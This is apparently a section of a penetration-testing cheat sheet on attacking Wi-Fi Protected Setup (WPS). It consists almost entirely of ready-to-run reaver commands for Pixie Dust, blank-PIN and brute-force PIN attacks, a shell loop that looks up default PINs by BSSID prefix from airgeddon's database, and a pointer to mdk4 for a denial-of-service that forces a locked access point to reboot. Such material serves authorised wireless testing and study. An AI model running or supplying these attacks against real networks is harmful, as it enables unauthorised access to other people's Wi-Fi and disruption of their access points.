#### WPS Attacks

Pixie WPS attack:
```
sudo reaver -c <channel> -b <BSSID> -i wlan1 -v -K
```

Blank PIN:
```
sudo reaver -c <channel> -b <BSSID> -i wlan1 -p "" -v
```

Default PIN values that depend on the first three bytes of the BSSID:
```
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db #  loads an array of PINs into memory
echo ${PINDB["0022FF"]}

cut -d ':' -f 1-3 bssids.txt | sort -u | tr -d ':' | while read line; do echo ${PINDB["$line"]};done
```

Brute force PIN:
```
sudo reaver -c <channel> -b <BSSID> -i wlan1 -v
```

DoS when WPS is locked, could reboot the AP which release the lock : `mdk4`